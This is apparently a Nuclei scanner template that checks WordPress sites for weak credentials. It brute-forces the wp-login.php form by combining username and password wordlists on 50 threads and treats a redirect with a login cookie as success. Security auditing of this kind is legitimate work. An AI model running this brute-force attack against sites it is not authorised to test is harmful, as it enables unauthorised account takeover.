id: wordpress-weak-credentials
info:
  author: evolutionsec
  classification:
    cve-id: null
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N
    cvss-score: 5.8
    cwe-id: CWE-522
  description: 'Weak WordPress Credentials were discovered.

    '
  name: WordPress - Weak Credentials
  reference:
  - https://www.wpwhitesecurity.com/strong-wordpress-passwords-wpscan/
  severity: critical
  tags: wordpress,default-login,fuzz
requests:
- attack: clusterbomb
  matchers:
  - condition: and
    part: header
    type: word
    words:
    - /wp-admin
    - wordpress_logged_in
  - status:
    - 302
    type: status
  matchers-condition: and
  payloads:
    passwords: helpers/wordlists/wp-passwords.txt
    users: helpers/wordlists/wp-users.txt
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    Content-Type: application/x-www-form-urlencoded

    Referer: {{BaseURL}}


    log={{users}}&pwd={{passwords}}

    '
  stop-at-first-match: true
  threads: 50
